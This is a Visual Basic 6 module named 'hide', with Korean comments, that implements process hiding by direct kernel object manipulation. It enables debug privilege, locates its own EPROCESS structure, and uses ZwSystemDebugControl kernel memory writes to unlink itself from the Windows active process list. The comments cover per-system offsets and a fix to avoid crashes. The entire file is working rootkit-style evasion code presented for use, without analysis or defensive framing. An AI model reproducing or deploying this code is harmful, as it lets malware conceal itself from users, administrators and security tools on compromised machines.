Attribute VB_Name = "hide"
Private Declare Function ZwSystemDebugControl Lib "ntdll" ( _
    ByVal ControlCode As Long, _
    ByRef InputBuffer As Any, _
    ByVal InputBufferLength As Long, _
    ByRef OutputBuffer As Any, _
    ByVal OutputBufferLength As Long, _
    ByRef ReturnLength As Long _
) As Long
Private Declare Function GetCurrentProcessId Lib "kernel32.dll" () As Long
Private Declare Sub RtlMoveMemory Lib "kernel32.dll" ( _
    ByRef Destination As Any, _
    ByRef Source As Any, _
    ByVal Length As Long _
)
Private Declare Function DuplicateHandle Lib "kernel32.dll" ( _
    ByVal hSourceProcessHandle As Long, ByVal hSourceHandle As Long, _
    ByVal hTargetProcessHandle As Long, ByRef lpTargetHandle As Long, _
    ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwOptions As Long _
) As Long
Private Declare Function CloseHandle Lib "kernel32.dll" ( _
    ByVal hObject As Long) As Long
Private Declare Function ZwQuerySystemInformation Lib "ntdll.dll" ( _
    ByVal SystemInformationClass As Long, _
    ByRef SystemInformation As Any, _
    ByVal SystemInformationLength As Long, _
    ByRef ReturnLength As Long _
) As Long
Private Declare Function RtlAdjustPrivilege Lib "ntdll.dll" _
     (ByVal Privilege As Long, _
     ByVal bEnablePrivilege As Long, _
     ByVal IsThreadPrivilege As Long, _
     ByRef PreviousValue As Long) As Long

Private Type SYSTEM_HANDLE_TABLE_ENTRY_INFO
    UniqueProcessId As Integer
    CreatorBackTraceIndex As Integer
    ObjectTypeIndex As Byte
    HandleAttributes As Byte
    HandleValue As Integer
    Object As Long
    GrantedAccess As Long
End Type
Private Type MEMORY_CHUNKS
    VirtualAddress As Long
    Buffer As Long
    Length As Long
End Type

Private Const SystemHandleInformation& = 16&
Private Const STATUS_INFO_LENGTH_MISMATCH& = &HC0000004
Private Const DUPLICATE_SAME_ACCESS& = 2&
Private Const NtCurrentProcess& = &HFFFFFFFF
Private Const SysDbgReadVirtualMemory& = 8&
Private Const SysDbgWriteVirtualMemory& = 9&

Private Function GetCurrentEPROCESSPtr() As Long
    Dim hProcess As Long, CurrentPID As Long, Buffer() As Byte, lRet As Long, lNeededLen As Long, Entries As Long, Entry As SYSTEM_HANDLE_TABLE_ENTRY_INFO, CurEntry As Long
    CurrentPID = GetCurrentProcessId()
    DuplicateHandle NtCurrentProcess, NtCurrentProcess, NtCurrentProcess, hProcess, 0, 0, DUPLICATE_SAME_ACCESS
    If hProcess = 0& Then Exit Function
    ReDim Buffer(255)
    lRet = ZwQuerySystemInformation(SystemHandleInformation, Buffer(0), 256, lNeededLen)
    If lRet = STATUS_INFO_LENGTH_MISMATCH Then
        ReDim Buffer(lNeededLen - 1)
        lRet = ZwQuerySystemInformation(SystemHandleInformation, Buffer(0), lNeededLen, lNeededLen)
        If lRet Then
            CloseHandle hProcess
            End
            Exit Function
        End If
    ElseIf lRet Then
        CloseHandle hProcess
        End
        Exit Function
    End If
    RtlMoveMemory Entries, Buffer(0), 4
    For CurEntry = 0 To Entries - 1
        RtlMoveMemory Entry, Buffer(CurEntry * Len(Entry) + 4), Len(Entry)
        If Entry.UniqueProcessId = CurrentPID And _
           Entry.HandleValue = hProcess Then
            GetCurrentEPROCESSPtr = Entry.Object
            Exit For
        End If
    Next
    CloseHandle hProcess
End Function

Sub HideMyProcess()
    Const FLINKOFFSET& = &H88& ' 시스템 마다 틀립니다.
    Const BLINKOFFSET& = FLINKOFFSET + 4&
    Const SeDebugPrivilege& = 20&
    Dim pProcess As Long, memChunk As MEMORY_CHUNKS, Flink As Long, Blink As Long
    RtlAdjustPrivilege SeDebugPrivilege, 1, 0, 0&
    pProcess = GetCurrentEPROCESSPtr
    With memChunk
        .VirtualAddress = pProcess + FLINKOFFSET
        .Length = 4&
        .Buffer = VarPtr(Flink)
    End With
    ZwSystemDebugControl SysDbgReadVirtualMemory, memChunk, Len(memChunk), ByVal 0&, 0, 0&
    With memChunk
        .VirtualAddress = pProcess + BLINKOFFSET
        .Length = 4&
        .Buffer = VarPtr(Blink)
    End With
    ZwSystemDebugControl SysDbgReadVirtualMemory, memChunk, Len(memChunk), ByVal 0&, 0, 0&
    If Flink Then
        ' 앞 프로세스에서 현재 프로세스에 대한 링크를 끊는다.
        With memChunk
            .VirtualAddress = Flink - FLINKOFFSET + BLINKOFFSET
            .Length = 4&
            .Buffer = VarPtr(Blink)
        End With
        ZwSystemDebugControl SysDbgWriteVirtualMemory, memChunk, Len(memChunk), ByVal 0&, 0, 0&
    End If
    If Blink Then
        ' 뒤 프로세스에서 현재 프로세스에 대한 링크를 끊는다.
        With memChunk
            .VirtualAddress = Blink ' - FLINKOFFSET + FLINKOFFSET
            .Length = 4&
            .Buffer = VarPtr(Flink)
        End With
        ZwSystemDebugControl SysDbgWriteVirtualMemory, memChunk, Len(memChunk), ByVal 0&, 0, 0&
    End If

    ' ### 중요한 부분!! 블루스크린을 방지하기 위해서 추가한 코드
    With memChunk
        .VirtualAddress = pProcess + FLINKOFFSET
        .Length = 4&
        .Buffer = VarPtr(pProcess)
    End With
    ZwSystemDebugControl SysDbgWriteVirtualMemory, memChunk, Len(memChunk), ByVal 0&, 0, 0&
    With memChunk
        .VirtualAddress = pProcess + BLINKOFFSET
        .Length = 4&
        .Buffer = VarPtr(pProcess)
    End With
    ZwSystemDebugControl SysDbgWriteVirtualMemory, memChunk, Len(memChunk), ByVal 0&, 0, 0&
End Sub







